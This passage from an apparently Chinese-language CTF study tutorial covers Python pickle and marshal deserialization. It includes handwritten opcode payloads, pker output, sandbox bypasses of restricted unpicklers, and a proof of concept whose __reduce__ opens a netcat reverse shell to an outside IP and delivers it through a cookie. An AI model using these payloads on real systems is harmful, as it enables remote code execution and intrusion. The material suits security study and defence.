class="hljs-string">&#x27;globals&#x27;</span>`。<br><br>共同作用：`cbuiltins`、`<span class="hljs-built_in">globals</span>` 和 `)Rp2` 一起表示创建一个字典，其中包含了两个键值对。<br><br>结果：此时堆栈顶部包含了一个字典。<br><br><span class="hljs-number">11.</span> `00g1`: 这个操作码表示将两个字典压入堆栈。<br><br><span class="hljs-number">12.</span> `(g2`: 这个操作码表示创建一个元组，包含了两个字典。<br><br><span class="hljs-number">13.</span> `S<span class="hljs-string">&#x27;builtins&#x27;</span>`: 这个操作码表示将字符串 `<span class="hljs-string">&#x27;builtins&#x27;</span>` 压入堆栈。<br><br><span class="hljs-number">14.</span> `tRp3`: 这个操作码表示调用 `<span class="hljs-built_in">__import__</span>` 函数，并将堆栈顶部的两个值作为参数传递给 `<span class="hljs-built_in">__import__</span>`。<br><br>共同作用：`(g2`、`S<span class="hljs-string">&#x27;builtins&#x27;</span>` 和 `tRp3` 一起表示使用 `<span class="hljs-built_in">__import__</span>` 函数导入 `builtins` 模块。<br><br>结果：此时堆栈顶部包含了 `builtins` 模块的对象。<br><br><span class="hljs-number">15.</span> `0g0`: 这个操作码表示将两个字典压入堆栈。<br><br><span class="hljs-number">16.</span> `(g3`: 这个操作码表示创建一个元组，包含了两个字典。<br><br><span class="hljs-number">17.</span> `S<span class="hljs-string">&#x27;eval&#x27;</span>`: 这个操作码表示将字符串 `<span class="hljs-string">&#x27;eval&#x27;</span>` 压入堆栈。<br><br><span class="hljs-number">18.</span> `tR`: 这个操作码表示调用 `<span class="hljs-built_in">eval</span>` 函数，并将堆栈顶部的两个值作为参数传递给 `<span class="hljs-built_in">eval</span>`。<br><br><span class="hljs-number">19.</span> `(S<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span>`: 这个操作码表示创建一个元组，包含了一个字符串，其中包含了 `<span class="hljs-built_in">eval</span>` 执行的代码。这段代码尝试执行系统命令 `whoami`。<br><br><span class="hljs-number">20.</span> `tR.`: 这个操作码表示调用 `<span class="hljs-built_in">eval</span>` 函数，并将堆栈顶部的两个值作为参数传递给 `<span class="hljs-built_in">eval</span>`。<br><br>最终结果：根据 `<span class="hljs-built_in">eval</span>` 函数的调用，它会执行字符串 `<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span>` 中的代码，即执行系统命令 `whoami`。由于这段代码是恶意的，它试图在系统上执行一个命令，这可能会引发安全问题。因此，处理来自不受信任源的 Pickle 数据时要非常小心，以防止潜在的安全风险。<br></code></pre></td></tr></table></figure>
<p>这里用pker工具使用的话，过程如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#payload.py</span><br> <br><span class="hljs-comment">#获取getattr函数</span><br><span class="hljs-built_in">getattr</span> = GLOBAL(<span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;getattr&#x27;</span>)<br><span class="hljs-comment">#获取字典的get方法</span><br>get = <span class="hljs-built_in">getattr</span>(GLOBAL(<span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;dict&#x27;</span>), <span class="hljs-string">&#x27;get&#x27;</span>)<br><span class="hljs-comment">#获取globals方法</span><br>golbals=GLOBAL(<span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;globals&#x27;</span>)<br><span class="hljs-comment">#获取字典</span><br>builtins_dict=golbals()<br><span class="hljs-comment">#获取builtins模块</span><br>__builtins__ = get(builtins_dict, <span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br><span class="hljs-comment">#获取eval函数</span><br><span class="hljs-built_in">eval</span>=<span class="hljs-built_in">getattr</span>(__builtins__,<span class="hljs-string">&#x27;eval&#x27;</span>)<br><span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">python3 pker.py &lt; pker_test.py<br><span class="hljs-string">b&quot;cbuiltins\ngetattr\np0\n0g0\n(cbuiltins\ndict\nS&#x27;get&#x27;\ntRp1\n0cbuiltins\nglobals\np2\n0g2\n(tRp3\n0g1\n(g3\nS&#x27;__builtins__&#x27;\ntRp4\n0g0\n(g4\nS&#x27;eval&#x27;\ntRp5\n0g5\n(S&#x27;__import__(\\&#x27;os\\&#x27;).system(\\&#x27;whoami\\&#x27;)&#x27;\ntR.&quot;</span><br></code></pre></td></tr></table></figure>
<h4 id="高校战疫网络安全分享赛-webtmp"><a href="#高校战疫网络安全分享赛-webtmp" class="headerlink" title="高校战疫网络安全分享赛-webtmp"></a>高校战疫网络安全分享赛:webtmp</h4>
<p>限制中，改写了<code>find_class</code>函数，只能生成<code>__main__</code>模块的pickle：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&#x27;__main__&#x27;</span>: <span class="hljs-comment"># 只允许__main__模块</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(sys.modules[<span class="hljs-string">&#x27;__main__&#x27;</span>], name)<br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))<br></code></pre></td></tr></table></figure>
<p>此外，禁止了<code>b'R'</code>：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">try</span>:<br>    pickle_data = request.form.get(<span class="hljs-string">&#x27;data&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;R&#x27;</span> <span class="hljs-keyword">in</span> base64.b64decode(pickle_data): <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;No... I don\&#x27;t like R-things. No Rabits, Rats, Roosters or RCEs.&#x27;</span><br></code></pre></td></tr></table></figure>
<p>目标是覆盖secret中的验证，由于secret被主程序引入，是存在于<code>__main__</code>下的secret模块中的，所以可以直接覆盖掉，此时就成功绕过了限制：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;name&#x27;</span><br><span class="hljs-string">S&quot;1&quot;</span><br><span class="hljs-string">S&quot;category&quot;</span><br><span class="hljs-string">S&quot;2&quot;</span><br><span class="hljs-string">db0(S&quot;1&quot;</span><br><span class="hljs-string">S&quot;2&quot;</span><br><span class="hljs-string">i__main__</span><br><span class="hljs-string">Animal</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>除了以上这些题外，还有BalsnCTF:pyshv1-v3和SUCTF-2019:guess_game四道题，由于手动写还是比较麻烦，在后文中使用pker工具完成。</p>
<h4 id="CTF-case1"><a href="#CTF-case1" class="headerlink" title="CTF-case1"></a>CTF-case1</h4>
<p>上述的反序列化题目还是有难度的，这里看小迪有一个简单的CTF案例，浅浅研究一下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><span class="hljs-comment"># /路由下的功能</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#对cookie中的user参数进行base64的解码</span><br>        user = base64.b64decode(request.cookies.get(<span class="hljs-string">&#x27;user&#x27;</span>))<br>        <span class="hljs-comment">#对user参数反序列化</span><br>        user = pickle.loads(user)<br>        <span class="hljs-comment">#将其中的username对应的值赋值</span><br>        username = user[<span class="hljs-string">&quot;username&quot;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-comment">#如果user数据中没有username键值，则将username赋值为指定字符串</span><br>        username = <span class="hljs-string">&quot;Guest&quot;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello %s&quot;</span> % username<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(<br>        host=<span class="hljs-string">&#x27;192.168.1.3&#x27;</span>,<br>        port=<span class="hljs-number">5000</span>,<br>        debug=<span class="hljs-literal">True</span><br>    )<br></code></pre></td></tr></table></figure>
<p>这里是开启环境的py文件。分析一波很明显就是我们要将user参数传入cookie并且还要进行base编码，那其中user可控，直接传入恶意序列化数据即可，我们运行之后bp抓包。接着我们编写一下poc</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">&#x27;nc -e cmd 124.220.233.26 5555&#x27;</span>,))<br><br>p = exp()<br>result = pickle.dumps(p)<br>result = base64.b64encode(result)<br><span class="hljs-built_in">print</span>(result)<br><br><span class="hljs-comment">#输出b&#x27;gASVNQAAAAAAAACMAm50lIwGc3lzdGVtlJOUjB1uYyAtZSBjbWQgMTI0LjIyMC4yMzMuMjYgNTU1NZSFlFKULg==&#x27;</span><br></code></pre></td></tr></table></figure>
<p>这里我们对reduce方法进行了重写，最后的数据如果被反序列化，那将会执行nc命令去尝试连接对应ip的port</p>
<p class='item-img' data-src='image-20231213193326126.png'><img src="image-20231213193326126.png" alt="image-20231213193326126"></p>
<p>如上图我们成功拿到shell，那这里我们仍然可以继续编写，使其功能完善，直接在py上对靶机进行请求，不必使用bp，我们做如下修改</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">&#x27;nc -e cmd 124.220.233.26 5555&#x27;</span>,))<br><br>p = exp()<br>result = pickle.dumps(p)<br><span class="hljs-built_in">print</span>(result)<br>result = base64.b64encode(result).decode()<br><span class="hljs-built_in">print</span>(result)<br><br>header = &#123;<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;user=&#x27;</span>+result<br>&#125;<br>requests.get(url=<span class="hljs-string">&#x27;http://192.168.246.1:5000/&#x27;</span>, headers=header)<br></code></pre></td></tr></table></figure>
<p>让其运行的时候自动访问靶机地址，如下图执行成功。</p>
<p class='item-img' data-src='image-20231213194702267.png'><img src="image-20231213194702267.png" alt="image-20231213194702267"></p>
<p>不过这里有一个嫌疑，就是该命令可以我再执行上述exp程序的时候（反序列化的时候会自动调用reduce方法）便被调用，因此我们可以本机开环境，另一台主机执行上述poc</p>
<p class='item-img' data-src='image-20231214113711236.png'><img src="image-20231214113711236.png" alt="image-20231214113711236"></p>
<p>如上图可以看到成功执行，不过这里似乎需要注意python版本问题，上述CTF环境是在Python3.8下搭建的，这里运行poc脚本似乎也需要在Python3.8下运行（因为我再python3.11下测试不成功）</p>
<h1>0x06 Marshal 反序列化</h1>
<p>由于<code>pickle</code>无法序列化<code>code</code>对象, 因此在<code>python2.6</code>后增加了一个<code>marshal</code>模块来处理<code>code</code>对象的序列化问题.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> marshal<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">demo</span>():<br>    <span class="hljs-keyword">import</span> os<br>    os.system(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br><br>code_serialized = base64.b64encode(marshal.dumps(demo()))<br><span class="hljs-built_in">print</span>(code_serialized)<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231116210202469.png'><img src="image-20231116210202469.png" alt="image-20231116210202469"></p>
<p>但是<code>marshal</code>不能直接使用<code>__reduce__</code>, 因为<code>reduce</code>是利用调用某个<code>callable</code>并传递参数来执行的, 而<code>marshal</code>函数本身就是一个<code>callable</code>, 需要执行它, 而不是将他作为某个函数的参数.</p>
<p>这时候就要利用上面分析的那个<code>PVM</code>操作码来进行构造了, 先写出来需要执行的内容, <code>Python</code>能通过<code>types.FunctionTyle(func_code,globals(),'')()</code>来动态地创建匿名函数, 这一部分的内容可以看<a target="_blank" rel="noopener" href="https://docs.python.org/3/library/types.html">官方文档</a>的介绍.</p>
<p>结合上文的示例代码, 最重要执行的是: <code>(types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), ''))()</code>.</p>
<p>这里直接贴一下别的师傅给出来的<code>Payload</code>模板.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> marshal<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>():<br>    <span class="hljs-keyword">import</span> os<br>    os.system(<span class="hljs-string">&#x27;whoami;/bin/sh&#x27;</span>)     <span class="hljs-comment"># evil code</span><br><br>shell = <span class="hljs-string">&quot;&quot;&quot;ctypes</span><br><span class="hljs-string">FunctionType</span><br><span class="hljs-string">(cmarshal</span><br><span class="hljs-string">loads</span><br><span class="hljs-string">(cbase64</span><br><span class="hljs-string">b64decode</span><br><span class="hljs-string">(S&#x27;%s&#x27;</span><br><span class="hljs-string">tRtRc__builtin__</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">(tRS&#x27;&#x27;</span><br><span class="hljs-string">tR(tR.&quot;&quot;&quot;</span> % base64.b64encode(marshal.dumps(foo.func_code))<br><br><span class="hljs-built_in">print</span>(pickle.loads(shell))<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231116210216495.png'><img src="image-20231116210216495.png" alt="image-20231116210216495"></p>
<h1>0x07 Pass总结</h1>
<h2 id="7-1-绕过builtins"><a href="#7-1-绕过builtins" class="headerlink" title="7-1-绕过builtins"></a>7.1 绕过builtins</h2>
<h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3>
<p>这里上述的CTF分析过该思路了，这里我就直接cv了</p>
<p>在一些例子中，我们常常会见到<code>module==&quot;builtins&quot;</code>这一限制，比如官方文档中的例子，只允许我们导入<code>builtins</code>这一模块</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">if</span> module == <span class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">in</span> safe_builtins:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br></code></pre></td></tr></table></figure>
<p>那么什么是<code>builtins</code>模块呢？</p>
<p>当我们启动Python之后，即使没有创建任何的变量或者函数，还是会有许多函数可以使用，如</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">&gt;&gt;&gt;<span class="hljs-built_in">int</span>(<span class="hljs-number">1</span>)<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>上述这类函数被我们称为”内置函数”，这其实就是builtins模块的功劳，这些内置函数都是包含在builtins模块内的。而Python解释器在启动时已经自动帮我们导入了builtins模块，所以我们自然就可以使用这些内置函数了。</p>
<p>我们可以通过<code>for i in sys.modules['builtins'].__dict__:print(i)</code>来查看该模块中包含的所有模块函数等，大致如下</p>
<p class='item-img' data-src='image-20231116211655339.png'><img src="image-20231116211655339.png" alt="image-20231116211655339"></p>
<p><strong>Code-Breaking:picklecode</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> builtins<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br>    blacklist = &#123;<span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;execfile&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>&#125;<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-comment"># Only allow safe classes from builtins.</span><br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.blacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br>        <span class="hljs-comment"># Forbid everything else.</span><br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %<br>                                     (module, name))<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">restricted_loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br></code></pre></td></tr></table></figure>
<p>题目将pickle能够引入的模块限定为<code>builtins</code>，并且设置了子模块黑名单：<code>&#123;'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'&#125;</code>，于是我们能够<strong>直接</strong>利用的模块有：</p>
<ul>
<li><code>builtins</code>模块中，黑名单外的子模块。</li>
<li>已经<code>import</code>的模块：<code>io</code>、<code>builtins</code>（需要先利用<code>builtins</code>模块中的函数）</li>
</ul>
<p>黑名单中没有<code>getattr</code>，所以可以通过<code>getattr</code>获取<code>io</code>或<code>builtins</code>的子模块以及子模块的子模块:)，而<code>builtins</code>里有<code>eval、exec</code>等危险函数，即使在黑名单中，也可以通过<code>getattr</code>获得。pickle不能直接获取<code>builtins</code>一级模块，但可以通过<code>builtins.globals()</code>获得<code>builtins</code>；这样就可以执行任意代码了。</p>
<p>我们可以借鉴Python沙箱逃逸的思路，获取我们想要的函数。代码没有禁用<code>getattr()</code>函数，<code>getattr</code>可以获取对象的属性值。因此我们可以通过<code>builtins.getattr(builtins,'eval')</code>的形式来获取eval函数</p>
<p class='item-img' data-src='image-20231116212103967.png'><img src="image-20231116212103967.png" alt="image-20231116212103967"></p>
<p>接下来我们得构造出一个<code>builtins</code>模块来传给<code>getattr</code>的第一个参数，我们可以使用<code>builtins.globals()</code>函数获取builtins模块包含的内容</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-built_in">print</span>(builtins.<span class="hljs-built_in">globals</span>())<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231116212125197.png'><img src="image-20231116212125197.png" alt="image-20231116212125197"></p>
<p>可见builtins模块中仍包含builtins模块。由于返回的结果是个字典，所以我们还需要获取get()函数</p>
<p class='item-img' data-src='image-20231116212132995.png'><img src="image-20231116212132995.png" alt="image-20231116212132995"></p>
<p>最终构造的payload为<code>builtins.getattr(builtins.getattr(builtins.dict,'get')(builtins.golbals(),'builtins'),'eval')(command)</code></p>
<p>思路有了，下面就是手写opcode了。首先获取get函数</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br> <br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>pickletools.dis(opcode)<br><span class="hljs-built_in">print</span>(pickle.loads(opcode))<br> <br><span class="hljs-comment">###结果如下</span><br>    <span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-string">&#x27;builtins getattr&#x27;</span><br>   <span class="hljs-number">18</span>: (    MARK<br>   <span class="hljs-number">19</span>: c        GLOBAL     <span class="hljs-string">&#x27;builtins dict&#x27;</span><br>   <span class="hljs-number">34</span>: S        STRING     <span class="hljs-string">&#x27;get&#x27;</span><br>   <span class="hljs-number">41</span>: t        TUPLE      (MARK at <span class="hljs-number">18</span>)<br>   <span class="hljs-number">42</span>: R    REDUCE<br>   <span class="hljs-number">43</span>: .    STOP<br>highest protocol among opcodes = <span class="hljs-number">0</span><br>&lt;method <span class="hljs-string">&#x27;get&#x27;</span> of <span class="hljs-string">&#x27;dict&#x27;</span> objects&gt;<br></code></pre></td></tr></table></figure>
<p>然后获取globals()字典</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br> <br>opcode2=<span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)R.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br> <br>pickletools.dis(opcode2)<br><span class="hljs-built_in">print</span>(pickle.loads(opcode2))<br> <br><span class="hljs-comment">###结果如下</span><br>    <span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-string">&#x27;builtins globals&#x27;</span><br>   <span class="hljs-number">18</span>: )    EMPTY_TUPLE<br>   <span class="hljs-number">19</span>: R    REDUCE<br>   <span class="hljs-number">20</span>: .    STOP<br>highest protocol among opcodes = <span class="hljs-number">1</span><br>&#123;<span class="hljs-string">&#x27;__name__&#x27;</span>: <span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="hljs-built_in">object</span> at <span class="hljs-number">0x000001EF06A308B0</span>&gt;, <span class="hljs-string">&#x27;__spec__&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;__annotations__&#x27;</span>: &#123;&#125;, <span class="hljs-string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="hljs-string">&#x27;builtins&#x27;</span> (built-<span class="hljs-keyword">in</span>)&gt;, <span class="hljs-string">&#x27;__file__&#x27;</span>: <span class="hljs-string">&#x27;C:/Users/34946/Desktop/安全学习/Pickle_Learning/Pickle_builtins1.py&#x27;</span>, <span class="hljs-string">&#x27;__cached__&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;pickle&#x27;</span>: &lt;module <span class="hljs-string">&#x27;pickle&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;C:\\Users\\34946\\AppData\\Local\\Programs\\Python\\Python38\\lib\\pickle.py&#x27;</span>&gt;, <span class="hljs-string">&#x27;pickletools&#x27;</span>: &lt;module <span class="hljs-string">&#x27;pickletools&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;C:\\Users\\34946\\AppData\\Local\\Programs\\Python\\Python38\\lib\\pickletools.py&#x27;</span>&gt;, <span class="hljs-string">&#x27;opcode1&#x27;</span>: <span class="hljs-string">b&quot;cbuiltins\ngetattr\n(cbuiltins\ndict\nS&#x27;get&#x27;\ntR.\n&quot;</span>, <span class="hljs-string">&#x27;opcode2&#x27;</span>: <span class="hljs-string">b&#x27;cbuiltins\nglobals\n)R.\n&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>
<p>现在我们有了get()，有了globals()字典，把他们组合起来我们就能够获取builtins模块了</p>
